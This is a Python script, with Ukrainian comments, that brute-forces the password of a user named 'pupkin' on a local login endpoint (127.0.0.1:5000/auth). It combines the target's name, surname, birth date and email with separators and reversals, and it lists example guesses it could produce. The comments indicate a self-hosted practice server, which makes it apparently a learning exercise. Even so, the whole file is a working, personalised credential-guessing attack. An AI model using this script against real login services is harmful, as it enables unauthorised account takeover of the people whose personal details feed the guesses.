# Перед тим як запустити брут, спочатку потрібно запустити сервер, на який дана програма відправляє запити

import requests

# у файлі users.json був доданий логін 'pupkin' з паролем 'vasya_1999_pupkin'

# логін до якого ми підбираємо пароль
login = 'pupkin'

# усі відомі дані про користувача
name = 'vasya'
surname = 'pupkin'
birth_date = '01'
birth_month = '09'
birth_year = '1999'
email_address = 'pupkin_vasya@gmail.com'

# комбінуємо всі відомі дані у список
combinations = [email_address, name, surname, birth_year, birth_month, birth_date, '$', '%', '.', '_']

base = len(combinations)

for x in range(10000):

    result = []
    while x:
        remainder = x % base
        x //= base
        # комбінуємо різні відомі дані зі списка та записуємо в result
        result.append(combinations[remainder])

    try:    # перша спроба забрутить пароль з символом '_'
        data = {'login': login, 'password': '_'.join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        data = {'login': login, 'password': ''.join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        # спроба забрутить пароль з символом '.'
        data = {'login': login, 'password': '.'.join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        # перевертаємо наш пароль
        result.reverse()

        # намагаємось тепер перевернути пароль та відправити на сервер
        data = {'login': login, 'password': "".join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        data = {'login': login, 'password': "_".join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break

        # спроба забрутить пароль з символом '.' та перевернутим паролем
        data = {'login': login, 'password': '.'.join(result)}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            break
    except Exception as e:
        print("Возникла ошибка", e)

# Варіації паролей які можуть бути підібрані:
# vasya_pupkin_1999
# pupkin_pupkin_1999
# pupkin_pupkin_vasya_1999
# vasya_pupkin_pupkin_vasya_1999
# vasya_pupkin
# vasya_09_pupkin_1999
# vasya.09.pupkin.1999
# vasyapupkin1999
# vasya_pupkin$1999